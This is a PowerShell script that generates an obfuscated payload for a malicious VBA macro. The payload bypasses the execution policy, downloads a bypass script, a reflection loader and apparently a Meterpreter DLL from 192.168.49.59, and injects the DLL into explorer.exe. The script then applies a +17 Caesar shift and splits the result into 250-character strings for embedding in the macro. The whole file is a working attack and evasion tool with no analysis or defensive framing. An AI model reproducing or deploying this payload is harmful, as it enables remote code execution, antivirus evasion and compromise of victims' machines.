$dollar = "$"
$mod = "mod"
$data = "data"
$m = $dollar + $mod

$d = $dollar + $data 
$p = $dollar + "procId"

$b = $dollar + "by"

#modified PE Reflection script 
$payload = "powershell -exec bypass -nop -c $b=(new-object system.net.webclient).downloadstring('http://192.168.49.59/patch2')| IEX;$m=(new-object system.net.webclient).downloadstring('http://192.168.49.59/Invoke-Reflection');IEX $m;$d=(new-object system.net.webclient).downloaddata('http://192.168.49.59/met.dll');$d;$p = (Get-Process -Name explorer).Id;$p;Invoke-Reflect -PEBytes $d -ProcId $p"
#$payload = $bypass

# This will generate the payload for the macro contained in VBAMacroCaesarCipher.txt



[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}


#$output
$i = 0 
$j = 0
$str = ""
$final = ""
ForEach($char in [char[]]$output.ToCharArray()){
    $str = $str + $char
    if ($i -eq 250) {
        $final = $final + "out"+$j + "+"
        "out"+$j+'="' + $str+ '"'
        $str = ""
        $j = $j + 1
        $i = 0
    }
    $i = $i + 1

    

}

if (($output.Length - ($j * 250)) -lt 250) {
        $index = 0
        $writeStr = ""
        ForEach($char in [char[]]$output.ToCharArray()) {
            if ($index -gt ($j * 250)) {
                $writeStr = $writeStr + $char
            } 
            $index  = $index + 1
        }
        "out"+$j+'="' + $writeStr+ '"'
        $final = $final + "out"+$j + "+"
    } 


$j = $j + 1
"final=" + $final

